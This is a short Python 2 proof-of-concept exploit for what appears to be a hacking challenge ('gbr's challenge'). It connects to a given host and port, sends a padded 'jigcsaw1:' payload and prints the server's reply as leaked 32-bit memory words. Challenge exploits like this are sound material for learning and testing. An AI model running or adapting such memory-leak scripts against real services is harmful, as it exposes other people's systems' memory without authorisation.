#!/usr/bin/env python2

# Memory leakage p0c for gbr's challenge
# Written by Maycon Maia Vitali ( maycon at hacknroll dot com )
# Hack N' Roll

import sys, socket, struct
from binascii import hexlify

pack = lambda x : struct.pack('I', x)
unpack = lambda x : struct.unpack('<L', x)[0]

if len(sys.argv) != 3 :
    print "Use: %s <host> <port>" % (sys.argv[0])
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

s0ck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s0ck.connect((host, port))

MALLOC_LENGTH = 500
s0ck.send('jigcsaw1:' + "A" * (MALLOC_LENGTH - len('jigcsaw1')))

recv = s0ck.recv(1024)
leak_data = [unpack(recv[4 * i : 4 * (i+1)]) for i in xrange(len(recv)/4)]

for data in leak_data:
    print "[+] Leak data: 0x%08x" % (data)

s0ck.close()


